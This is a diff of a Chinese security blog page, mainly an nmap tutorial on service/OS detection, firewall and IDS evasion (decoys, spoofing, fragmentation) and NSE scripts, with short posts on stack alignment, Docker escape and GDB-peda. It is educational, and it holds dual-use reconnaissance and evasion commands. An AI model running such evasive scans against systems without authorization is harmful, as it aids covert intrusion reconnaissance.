+<p>如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms）。通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。</p>
+<p>如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。</p>
+<p>如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。</p>
+<p>如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。</p>
+<p>如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。</p>
+<h3 id="2-4-2-版本侦测的用法"><a href="#2-4-2-版本侦测的用法" class="headerlink" title="2.4.2    版本侦测的用法"></a>2.4.2    版本侦测的用法</h3><p>版本侦测方面的命令行选项比较简单。</p>
+<p>[plain]view plaincopy</p>
+<p>-sV: 指定让Nmap进行版本侦测</p>
+<p>–version-intensity : 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</p>
+<p>–version-light: 指定使用轻量侦测方式 (intensity 2)</p>
+<p>–version-all: 尝试使用所有的probes进行侦测 (intensity 9)</p>
+<p>–version-trace: 显示出详细的版本侦测过程信息。</p>
+<h3 id="2-4-3-版本侦测演示"><a href="#2-4-3-版本侦测演示" class="headerlink" title="2.4.3    版本侦测演示"></a>2.4.3    版本侦测演示</h3><p>命令：</p>
+<p>nmap –sV 192.168.1.100</p>
+<p>对主机192.168.1.100进行版本侦测。</p>
+<p>从结果中，我们可以看到996个端口是关闭状态，对于4个open的端口进行版本侦测。图中红色为版本信息。红色线条划出部分是版本侦测得到的附加信息，因为从应用中检测到微软特定的应用服务，所以推断出对方运行的Windows的操作系统。</p>
+<h2 id="2-5-OS侦测"><a href="#2-5-OS侦测" class="headerlink" title="2.5    OS侦测"></a>2.5    OS侦测</h2><p>操作系统侦测用于检测目标主机运行的操作系统类型及设备类型等信息。</p>
+<p>Nmap拥有丰富的系统数据库nmap-os-db，目前可以识别2600多种操作系统与设备类型。</p>
+<h3 id="2-5-1-OS侦测原理"><a href="#2-5-1-OS侦测原理" class="headerlink" title="2.5.1    OS侦测原理"></a>2.5.1    OS侦测原理</h3><p>Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。</p>
+<p>具体实现方式如下：</p>
+<p>Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。</p>
+<p>分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。</p>
+<p>将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。</p>
+<h3 id="2-5-2-OS侦测用法"><a href="#2-5-2-OS侦测用法" class="headerlink" title="2.5.2    OS侦测用法"></a>2.5.2    OS侦测用法</h3><p>OS侦测的用法简单，Nmap提供的命令比较少。</p>
+<p>[plain]view plaincopy</p>
+<p>-O: 指定Nmap进行OS侦测。</p>
+<p>–osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）。</p>
+<p>–osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统。</p>
+<h3 id="2-5-3-OS侦测演示"><a href="#2-5-3-OS侦测演示" class="headerlink" title="2.5.3    OS侦测演示"></a>2.5.3    OS侦测演示</h3><p>命令：</p>
+<p>nmap –O 192.168.1.100</p>
+<p>从上图中可看到，指定-O选项后先进行主机发现与端口扫描，根据扫描到端口来进行进一步的OS侦测。获取的结果信息有设备类型，操作系统类型，操作系统的CPE描述，操作系统细节，网络距离等。</p>
+<h1 id="3-Nmap高级用法"><a href="#3-Nmap高级用法" class="headerlink" title="3     Nmap高级用法"></a>3     Nmap高级用法</h1><h2 id="3-1-防火墙-IDS规避"><a href="#3-1-防火墙-IDS规避" class="headerlink" title="3.1    防火墙/IDS规避"></a>3.1    防火墙/IDS规避</h2><p>防火墙与IDS规避为用于绕开防火墙与IDS（入侵检测系统）的检测与屏蔽，以便能够更加详细地发现目标主机的状况。</p>
+<p>Nmap提供了多种规避技巧，通常可以从两个方面考虑规避方式：数据包的变换（Packet Change）与时序变换（Timing Change）。</p>
+<h3 id="3-1-1-规避原理"><a href="#3-1-1-规避原理" class="headerlink" title="3.1.1    规避原理"></a>3.1.1    规避原理</h3><h4 id="3-1-1-1-分片（Fragmentation）"><a href="#3-1-1-1-分片（Fragmentation）" class="headerlink" title="3.1.1.1    分片（Fragmentation）"></a>3.1.1.1    分片（Fragmentation）</h4><p>将可疑的探测包进行分片处理（例如将TCP包拆分成多个IP包发送过去），某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查。</p>
+<h4 id="3-1-1-2-IP诱骗（IP-decoys）"><a href="#3-1-1-2-IP诱骗（IP-decoys）" class="headerlink" title="3.1.1.2    IP诱骗（IP decoys）"></a>3.1.1.2    IP诱骗（IP decoys）</h4><p>在进行扫描时，将真实IP地址和其他主机的IP地址（其他主机需要在线，否则目标主机将回复大量数据包到不存在的主机，从而实质构成了拒绝服务攻击）混合使用，以此让目标主机的防火墙或IDS追踪检查大量的不同IP地址的数据包，降低其追查到自身的概率。注意，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实IP地址。</p>
+<h4 id="3-1-1-3-IP伪装（IP-Spoofing）"><a href="#3-1-1-3-IP伪装（IP-Spoofing）" class="headerlink" title="3.1.1.3    IP伪装（IP Spoofing）"></a>3.1.1.3    IP伪装（IP Spoofing）</h4><p>顾名思义，IP伪装即将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机在与之通信。需要注意，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan或匿名代理（如TOR）等网络技术。</p>
+<h4 id="3-1-1-4-指定源端口"><a href="#3-1-1-4-指定源端口" class="headerlink" title="3.1.1.4    指定源端口"></a>3.1.1.4    指定源端口</h4><p>某些目标主机只允许来自特定端口的数据包通过防火墙。例如FTP服务器配置为：允许源端口为21号的TCP包通过防火墙与FTP服务端通信，但是源端口为其他端口的数据包被屏蔽。所以，在此类情况下，可以指定Nmap将发送的数据包的源端口都设置特定的端口。</p>
+<h4 id="3-1-1-5-扫描延时"><a href="#3-1-1-5-扫描延时" class="headerlink" title="3.1.1.5    扫描延时"></a>3.1.1.5    扫描延时</h4><p>某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率（例如，Solaris 系统通常会限制每秒钟只能产生一个ICMP消息回复给UDP扫描），所以，定制该情况下发包的频率和发包延时可以降低目标主机的审查强度、节省网络带宽。</p>
+<h4 id="3-1-1-6-其他技术"><a href="#3-1-1-6-其他技术" class="headerlink" title="3.1.1.6    其他技术"></a>3.1.1.6    其他技术</h4><p>Nmap还提供多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的MTU、指定TTL、指定伪装的MAC地址、使用错误检查和（badchecksum）。</p>
+<p>更多信息<a href="http://nmap.org/book/man-bypass-firewalls-ids.html" target="_blank" rel="noopener">http://nmap.org/book/man-bypass-firewalls-ids.html</a></p>
+<h3 id="3-1-2-规避用法"><a href="#3-1-2-规避用法" class="headerlink" title="3.1.2    规避用法"></a>3.1.2    规避用法</h3><p>[plain]view plaincopy</p>
+<p>-f; –mtu : 指定使用分片、指定数据包的MTU.</p>
+<p>-D : 用一组IP地址掩盖真实地址，其中ME填入自己的IP地址。</p>
+<p>-S : 伪装成其他IP地址</p>
+<p>-e : 使用特定的网络接口</p>
+<p>-g/–source-port : 使用指定源端口</p>
+<p>–data-length : 填充随机数据让数据包长度达到Num。</p>
+<p>–ip-options : 使用指定的IP选项来发送数据包。</p>
+<p>–ttl : 设置time-to-live时间。</p>
+<p>–spoof-mac : 伪装MAC地址</p>
+<p>–badsum: 使用错误的checksum来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或IDS/IPS）。</p>
+<h3 id="3-1-3-规避演示"><a href="#3-1-3-规避演示" class="headerlink" title="3.1.3    规避演示"></a>3.1.3    规避演示</h3><p>使用命令：</p>
+<p>nmap -v -F -Pn -D192.168.1.100,192.168.1.102,ME -e eth0 -g 3355 192.168.1.1</p>
+<p>其中，-F表示快速扫描100个端口；-Pn表示不进行Ping扫描；-D表示使用IP诱骗方式掩盖自己真实IP（其中ME表示自己IP）；-e eth0表示使用eth0网卡发送该数据包；-g 3355表示自己的源端口使用3355；192.168.1.1是被扫描的目标IP地址。</p>
+<p>我们可以从Wireshark中看到数据包的流动情况：对于每个探测包，Nmap都使用-D选项指定的IP地址发送不同的数据包，从而达到扰乱对方防火墙/IDS检查的目的（更好的方式-D选项中嵌入RND随机数，这样更具有迷惑性）。当探测到80端口时候，目标主机向我们回复了SYN/ACK包回来（当然也向其他诱骗的IP回复SYN/ACK包，我们无法接收到），证明80端口是开放的。</p>
+<h2 id="3-2-NSE脚本引擎"><a href="#3-2-NSE脚本引擎" class="headerlink" title="3.2    NSE脚本引擎"></a>3.2    NSE脚本引擎</h2><p>NSE脚本引擎（Nmap Scripting Engine）是Nmap最强大最灵活的功能之一，允许用户自己编写脚本来执行自动化的操作或者扩展Nmap的功能。</p>
+<p>NSE使用Lua脚本语言，并且默认提供了丰富的脚本库，目前已经包含14个类别的350多个脚本。</p>
+<p>NSE的设计初衷主要考虑以下几个方面：</p>
+<p>网络发现（Network Discovery）</p>
+<p>更加复杂的版本侦测（例如skype软件）</p>
+<p>漏洞侦测(Vulnerability Detection)</p>
+<p>后门侦测(Backdoor Detection)</p>
+<p>漏洞利用(Vulnerability Exploitation)</p>
+<h3 id="3-2-1-NSE创建脚本方法"><a href="#3-2-1-NSE创建脚本方法" class="headerlink" title="3.2.1    NSE创建脚本方法"></a>3.2.1    NSE创建脚本方法</h3><p>下面以daytime.nse脚本为例说明一下NSE格式。</p>
+<p>NSE的使用Lua脚本，并且配置固定格式，以减轻用户编程负担。通常的一个脚本分为几个部分：</p>
+<p>description字段：描述脚本功能的字符串，使用双层方括号表示。</p>
+<p>comment字段：以–开头的行，描述脚本输出格式</p>
+<p>author字段：描述脚本作者</p>
+<p>license字段：描述脚本使用许可证，通常配置为Nmap相同的license</p>
+<p>categories字段：描述脚本所属的类别，以对脚本的调用进行管理。</p>
+<p>rule字段：描述脚本执行的规则，也就是确定触发脚本执行的条件。在Nmap中有四种类型的规则，prerule用于在Nmap没有执行扫描之前触发脚本执行，这类脚本并不需用到任何Nmap扫描的结果；hostrule用在Nmap执行完毕主机发现后触发的脚本，根据主机发现的结果来触发该类脚本；portrule用于Nmap执行端口扫描或版本侦测时触发的脚本，例如检测到某个端口时触发某个脚本执行以完成更详细的侦查。postrule用于Nmap执行完毕所有的扫描后，通常用于扫描结果的数据提取和整理。在上述实例中，只有一个portrule，说明该脚本在执行端口扫描后，若检测到TCP 13号端口开放，那么触发该脚本的执行。</p>
+<p>action字段：脚本执行的具体内容。当脚本通过rule字段的检查被触发执行时，就会调用action字段定义的函数。</p>
+<h3 id="3-2-2-NSE脚本用法"><a href="#3-2-2-NSE脚本用法" class="headerlink" title="3.2.2    NSE脚本用法"></a>3.2.2    NSE脚本用法</h3><p>Nmap提供不少脚本使用的命令行参数。</p>
+<p>[plain]view plaincopy</p>
+<p>-sC: 等价于 –script=default，使用默认类别的脚本进行扫描。</p>
+<p>–script=: 使用某个或某类脚本进行扫描，支持通配符描述</p>
+<p>–script-args=: 为脚本提供默认参数</p>
+<p>–script-args-file=filename: 使用文件来为脚本提供参数</p>
+<p>–script-trace: 显示脚本执行过程中发送与接收的数据</p>
+<p>–script-updatedb: 更新脚本数据库</p>
+<p>–script-help=: 显示脚本的帮助信息，其中部分可以逗号分隔的文件或脚本类别。</p>
+<h3 id="3-2-3-NSE用法演示"><a href="#3-2-3-NSE用法演示" class="headerlink" title="3.2.3    NSE用法演示"></a>3.2.3    NSE用法演示</h3><p>配合脚本扫描192.168.1.1，查看能否获得有用的信息。</p>
+<p>命令如下：</p>
+<p>nmap –sV –p 80 –v –script default,http*192.168.1.1</p>
+<p>从上图中，我们可以看到Nmap扫描到对方80端口是开放的，然后使用了大量的名字为http开头的脚本对其进行扫描。扫描过程发现在http-auth脚本执行，出现了“Basic relm=TP-LINK Wireless N router WR740”字样（红线划出部分），这里已经挖掘对方的设备类型与具体版本信息。如果我们知道更多关于WR740已知的漏洞，那么就可以进行更进一步的渗透测试了。</p>
+<h1 id="4-参考资料"><a href="#4-参考资料" class="headerlink" title="4     参考资料"></a>4     参考资料</h1><h2 id="4-1-书籍"><a href="#4-1-书籍" class="headerlink" title="4.1    书籍"></a>4.1    书籍</h2><p>Nmap Network Scanning</p>
+<p>Nmap创始人Fyodor编写的Nmap的权威指南，非常详尽地描述Nmap的实现原理及使用方法。Nmap官方文档正是来自该书部分章节。</p>
+<p>Secrets of Network Cartography</p>
+<p>该书对Nmap的实现原理及使用场景有比较丰富的介绍。</p>
+<p>Nmap in the Enterprise: Your Guide to Network Scanning</p>
+<p>这本书描述Nmap在企业领域的运用。</p>
+<p>Nmap mindmap.pdf</p>
+<p>这nmap使用方法的思维导图（一页纸的图片），对Nmap用法整理很完整。</p>
+<h2 id="4-2-网站"><a href="#4-2-网站" class="headerlink" title="4.2    网站"></a>4.2    网站</h2><p>官网：<a href="http://www.nmap.org" target="_blank" rel="noopener">www.nmap.org</a></p>
+<p>安全工具排名：<a href="http://sectools.org/" target="_blank" rel="noopener">http://sectools.org/</a></p>
 
-</div>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://gumeng.fun/2020/02/15/20200215-nmap使用方法/" data-id="cl3ej0qug0025q4vkqpxiivmm" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nmap/">nmap</a></li></ul>
 
-<hr>
+    </footer>
+  </div>
+  
+</article>
 
 
+  
+    <article id="post-20190215-bin文件中对齐问题" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/02/15/20190215-bin文件中对齐问题/" class="article-date">
+  <time datetime="2019-02-15T01:50:08.000Z" itemprop="datePublished">2019-02-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Exploit/">Exploit</a>
+  </div>
 
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2019/02/15/20190215-bin文件中对齐问题/">
-        <h2 class="post-title">
-            二进制文件中堆栈对齐问题初探
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-02-15
-        </p>
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
         
-        <div class="post-content-preview">
-            <p>
-                明白程序的执行逻辑链接如下，问题是：
-stackoverflow 
-&emsp;&emsp;在程序开始运行前，都有对临时环境变量保存的习惯，这个操作在x86体系下是对堆栈进行操作。
-12345678910111213141516178048394:8d 4c 24 04  lea0x4(%esp..
-            </p>
-        </div>
-    </a>
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/15/20190215-bin文件中对齐问题/">二进制文件中堆栈对齐问题初探</a>
+    </h1>
+  
 
-</div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="明白程序的执行逻辑"><a href="#明白程序的执行逻辑" class="headerlink" title="明白程序的执行逻辑"></a>明白程序的执行逻辑</h1><p>链接如下，问题是：</p>
+<p><a href="https://stackoverflow.com/questions/4228261/understanding-the-purpose-of-some-assembly-statements" target="_blank" rel="noopener">stackoverflow </a></p>
+<p>&emsp;&emsp;在程序开始运行前，都有对临时环境变量保存的习惯，这个操作在x86体系下是对堆栈进行操作。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8048394</span>:<span class="number">8</span>d <span class="number">4</span><span class="keyword">c</span> <span class="number">24</span> <span class="number">04</span>  lea<span class="number">0x4</span>(<span class="symbol">%esp</span>),<span class="symbol">%ecx</span>  <span class="comment">; ??</span></span><br><span class="line"><span class="comment">8048398:83 e4 f0 and$0xfffffff0,%esp; ??</span></span><br><span class="line"><span class="comment">804839b:ff 71 fc pushl  -0x4(%ecx)  ; ??</span></span><br><span class="line"><span class="comment">804839e:55   push   %ebp; Store the Base pointer</span></span><br><span class="line"><span class="comment">804839f:89 e5mov%esp,%ebp   ; Initialize the Base pointer with the stack pointer</span></span><br><span class="line"><span class="comment">80483a1:51   push   %ecx; ??</span></span><br><span class="line"><span class="comment">80483a2:83 ec 4c sub$0x4c,%esp  ; ??</span></span><br><span class="line"><span class="comment">80483a5:c7 45 f8 0c 00 00 00 movl   $0xc,-0x8(%ebp) ; Move 12 into -0x8(%ebp)</span></span><br><span class="line"><span class="comment">80483ac:c7 45 f4 14 00 00 00 movl   $0x14,-0xc(%ebp); Move 20 into -0xc(%ebp)</span></span><br><span class="line"><span class="comment">80483b3:8b 45 f8 mov-0x8(%ebp),%eax ; Move 12@-0x8(%ebp) into eax</span></span><br><span class="line"><span class="comment">80483b6:83 c0 7b add$0x7b,%eax  ; Add 123 to 12@eax</span></span><br><span class="line"><span class="comment">80483b9:89 45 f4 mov%eax,-0xc(%ebp) ; Store the result into b@-0xc(%ebp)</span></span><br><span class="line"><span class="comment">80483bc:b8 00 00 00 00   mov$0x0,%eax   ; Move 0 into eax</span></span><br><span class="line"><span class="comment">80483c1:83 c4 10 add$0x10,%esp  ; ??</span></span><br><span class="line"><span class="comment">80483c4:59   pop%ecx; ??</span></span><br><span class="line"><span class="comment">80483c5:5d   pop%ebp; ??</span></span><br><span class="line"><span class="comment">80483c6:8d 61 fc lea-0x4(%ecx),%esp ; ??</span></span><br></pre></td></tr></table></figure>
+<p>Understanding the purpose of some assembly statements<br>如何理解？</p>
+<pre><code>and $0xfffffff0,%esp 
+</code></pre><p>官方给出的解释是：</p>
+<blockquote>
+<p>This code makes sure that the stack is aligned to 16 bytes. After this operation esp will be less than or equal to what it was before this operation, so the stack may grow, which protects anything that might already be on the stack. This is sometimes done in main just in case the function is called with an unaligned stack, which can cause things to be really slow (16 byte is a cache line width on x86, I think, though 4 byte alignment is what is really important here). If main has a unaligned stack the rest of the program will too.</p>
+</blockquote>
+<p>总的来说就是为了对齐</p>
+<blockquote>
+<p>Many architectures have a concept called alignment where the hardware is designed to operate on addresses that are multiples of the word size. For example, on a 32-bit processor, objects might be aligned to 32-bit boundaries (4 bytes), and on a 64-bit processor, objects might be aligned to 64-bit boundaries (8 bytes). An aligned pointer is one that points to an address that’s a multiple of the word size, and an unaligned pointer is one that’s not pointing to an address that’s a multiple of the word size.</p>
+<p>On most architectures, reading or writing unaligned pointers suffers some sort of penalty. On some processors, doing this causes a bus error, which usually terminates the program immediately. On others, such as x86, unaligned reads and writes are legal but suffer a performance penalty due to how the hardware is structured.</p>
+</blockquote>
+<p>In your code, 0xBAD = 2989 is probably not aligned, since it’s not a multiple of most common word sizes, and the pointer you write to is also probably not aligned.</p>
+<p>Hope this helps!</p>
+<p>链接地址:<a href="https://stackoverflow.com/questions/20183094/what-is-a-misaligned-pointer" target="_blank" rel="noopener">https://stackoverflow.com/questions/20183094/what-is-a-misaligned-pointer</a></p>
+<h1 id="亲自搜一搜"><a href="#亲自搜一搜" class="headerlink" title="亲自搜一搜"></a>亲自搜一搜</h1><p>随便搜搜bin文件里，<br><img src="http://i.imgur.com/qhBqnj4.png" alt=""></p>
+<p>可以看到0x80482E5 esp自身自身进行了对齐，而Libc_csu_fini中实现了对main调用前的初始化操作，很多细节还是需要看</p>
+<p>调试下查看下位置,程序执行前，esp地址为：</p>
+<pre><code>ESP: 0xffffd0d4 --&gt; 0xffffd2ad 
+</code></pre><p>程序执行以后，栈的地址应该是低地址延伸：</p>
+<pre><code>ESP: 0xffffd0d0 --&gt; 0x1
+</code></pre><p>然后，可以看到向下移动了0x04个地址空间，浪费了这点地址，但是对齐了。</p>
+<p>Sometimes , compiler will optimize the code by adding some padding to make it align to word boundary<br>You have to inspect the assembly code to know the exactly stack position</p>
+<p>编译器执行操作命令</p>
 
-<hr>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://gumeng.fun/2019/02/15/20190215-bin文件中对齐问题/" data-id="cl3ej0qub001rq4vk9zmoqxtb" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
 
 
-
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2018/10/24/20181024-docker之容器逃逸问题/">
-        <h2 class="post-title">
-            escape
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-10-24
-        </p>
+  
+    <article id="docker-20181024-docker之容器逃逸问题" class="article article-type-docker" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/24/20181024-docker之容器逃逸问题/" class="article-date">
+  <time datetime="2018-10-24T15:51:52.000Z" itemprop="datePublished">2018-10-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
         
-        <div class="post-content-preview">
-            <p>
-                docker容器逃逸问题研究docker
-.…………………………………………………………………………………………………………………….  阿萨
-docker escapedocker 是一种轻量化虚拟环境，我主要关注如何实现docker逃逸，目前从公开的CVE中可以发现docker逃逸的基本方法..
-            </p>
-        </div>
-    </a>
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/24/20181024-docker之容器逃逸问题/">escape</a>
+    </h1>
+  
 
-</div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="docker容器逃逸问题研究"><a href="#docker容器逃逸问题研究" class="headerlink" title="docker容器逃逸问题研究"></a>docker容器逃逸问题研究</h1><p>docker</p>
+<p>.<br>…………………………………………………………………………………………………………………….  阿萨</p>
+<h1 id="docker-escape"><a href="#docker-escape" class="headerlink" title="docker escape"></a>docker escape</h1><p>docker 是一种轻量化虚拟环境，我主要关注如何实现docker逃逸，目前从公开的CVE中可以发现docker逃逸的基本方法</p>
+<h2 id="how-to-get-root-privilege"><a href="#how-to-get-root-privilege" class="headerlink" title="how to get root privilege ?"></a>how to get root privilege ?</h2><p>docker escape<br>基于docker的逃逸</p>
 
-<hr>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://gumeng.fun/2018/10/24/20181024-docker之容器逃逸问题/" data-id="cl3ej0qu9001nq4vketi7iwvn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
 
+  
+    <article id="post-20180615-GDB_peda插件使用指南" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/15/20180615-GDB_peda插件使用指南/" class="article-date">
+  <time datetime="2018-06-15T01:50:08.000Z" itemprop="datePublished">2018-06-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/tools/">tools</a>
+  </div>
 
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2018/06/15/20180615-gdb 无法attach进程/">
-        <h2 class="post-title">
-            GDB 无法attach进程
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-15
-        </p>
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
         
-        <div class="post-content-preview">
-            <p>
-                 gdb attach fails with ptrace: Operation not permittedToday I ran into a weird problem. I could not attach to my own process with gdb. The process r..
-            </p>
-        </div>
-    </a>
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/15/20180615-GDB_peda插件使用指南/">GDB_PEDA Exploit 调试插件安装</a>
+    </h1>
+  
 
-</div>
-
-<hr>
-
-
-
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2018/06/15/20180615-GDB_peda插件使用指南/">
-        <h2 class="post-title">
-            GDB_PEDA Exploit 调试插件安装
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-15
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                GDB-peda 神器 利用命令Key Features:
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="GDB-peda-神器-利用命令"><a href="#GDB-peda-神器-利用命令" class="headerlink" title="GDB-peda 神器 利用命令"></a>GDB-peda 神器 利用命令</h1><pre><code>Key Features:
 
 Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.
-A..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2018/06/15/20180615-Linux下的堆块伪造/">
-        <h2 class="post-title">
-            Linux Pwn 之堆块伪造技术
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-15
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                借鉴下别人的文章，如有冒犯，还望多多包涵
-Linux下的堆块伪造这是一个基本的堆利用技巧，很多堆利用的地方都会用到。比如double free。这种利用方式的出现是由于unlink的check机制的出现。这里主要从堆溢出和double free两个角度谈一下。
-原理1.ptmalloc的相邻空块..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
+Add commands to support debugging and exploit development (for a full list of commands use peda help):
+aslr -- Show/set ASLR setting of GDB
+checksec -- Check for various security options of binary
+dumpargs -- Display arguments passed to a function when stopped at a call instruction
+dumprop -- Dump all ROP gadgets in specific memory range
+elfheader -- Get headers information from debugged ELF file
+elfsymbol -- Get non-debugging symbol information from an ELF file
+lookup -- Search for all addresses/references to addresses which belong to a memory range
+patch -- Patch memory start at an address with string/hexstring/int
+pattern -- Generate, search, or write a cyclic pattern to memory
+procinfo -- Display various info from /proc/pid/
+pshow -- Show various PEDA options and other settings
+pset -- Set various PEDA options and other settings
+readelf -- Get headers information from an ELF file
+ropgadget -- Get common ROP gadgets of binary or library
+ropsearch -- Search for ROP gadgets in memory
+searchmem|find -- Search for a pattern in memory; support regex search
+shellcode -- Generate or download common shellcodes.
+skeleton -- Generate python exploit code template
+vmmap -- Get virtual mapping address ranges of section(s) in debugged process
+xormem -- XOR a memory region with a key
 
 
+用gdb查看内存
+格式: x /nfu
+说明
+x 是 examine 的缩写
+n表示要显示的内存单元的个数
+f表示显示方式, 可取如下值
+x 按十六进制格式显示变量。
+d 按十进制格式显示变量。
+u 按十进制格式显示无符号整型。
+o 按八进制格式显示变量。
+t 按二进制格式显示变量。
+a 按十六进制格式显示变量。
+i 指令地址格式
+c 按字符格式显示变量。
+f 按浮点数格式显示变量。
+u表示一个地址单元的长度
+b表示单字节，
+h表示双字节，
+w表示四字节，
+g表示八字节
 
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2018/06/15/20180615-peda-pwntools安装使用问题/">
-        <h2 class="post-title">
-            Peda 安装指南
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-15
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                Peda 安装使用指南参考连接：http://www.ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf
-Peda的创作者是Long Le ，vns security的研究员，
-..
-            </p>
-        </div>
-    </a>
+常用方法：
+x/16xw (address) 以16个内存单元，x表示十六进制显示，w表示四字节
+x/8xh  (address) 以8个内存单元，x表示十六进制显示，h表示两字节
+x/8ih  (address) 以8个内存单位，i表示地址格式表示，主要用于GOT表，PIT表中地址表示，h表示两字节。
 
-</div>
-
-<hr>
-
-
-
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2018/01/15/20180115-linux提权之setuid方法/">
-        <h2 class="post-title">
-            Linux 提权之setuid使用提权
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-01-15
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                
-自己收集部分内容，如有错误，请联系youngtala@gmail.com
-
-linxu setuid 安全威胁setuid 机制一般查看linux下某命令权限
-1234root@localhost# ll /etc/passwd -rwsr-xr-x 1 root root 22960 Jul..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
+   gdb-peda$ x/16iw 0x8048380
+   0x8048380 &lt;read@plt&gt;:    jmpDWORD PTR ds:0x804a000
+   0x8048386 &lt;read@plt+6&gt;:    push   0x0
+=&gt; 0x804838b &lt;read@plt+11&gt;:    jmp0x8048370
+   0x8048390 &lt;getegid@plt&gt;:    jmpDWORD PTR ds:0x804a004
+   0x8048396 &lt;getegid@plt+6&gt;:    push   0x8
+   0x804839b &lt;getegid@plt+11&gt;:    jmp0x8048370
+   0x80483a0 &lt;system@plt&gt;:    jmpDWORD PTR ds:0x804a008
